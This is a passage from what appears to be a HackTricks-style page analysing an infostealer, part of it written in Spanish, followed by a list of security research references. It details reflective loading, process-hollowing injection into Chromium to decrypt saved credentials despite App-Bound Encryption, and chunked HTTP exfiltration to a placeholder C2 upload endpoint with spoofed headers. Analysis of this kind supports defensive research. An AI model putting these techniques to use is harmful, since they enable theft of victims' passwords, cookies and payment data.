- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` itera una tabla global de punteros a funciones `memory_generators` y crea un hilo por cada módulo habilitado (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Cada hilo escribe resultados en buffers compartidos e informa su conteo de archivos después de una ventana de join de ~45s.
- Una vez terminado, todo se comprime con la librería `miniz` enlazada estáticamente como `%TEMP%\\Log.zip`. `ThreadPayload1` luego duerme 15s y transmite el archivo en chunks de 10 MB vía HTTP POST a `http://<C2>:6767/upload`, falsificando un browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Cada chunk añade `User-Agent: upload`, `auth: <build_id>`, opcional `w: <campaign_tag>`, y el último chunk agrega `complete: true` para que el C2 sepa que la reensamblación ha terminado.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
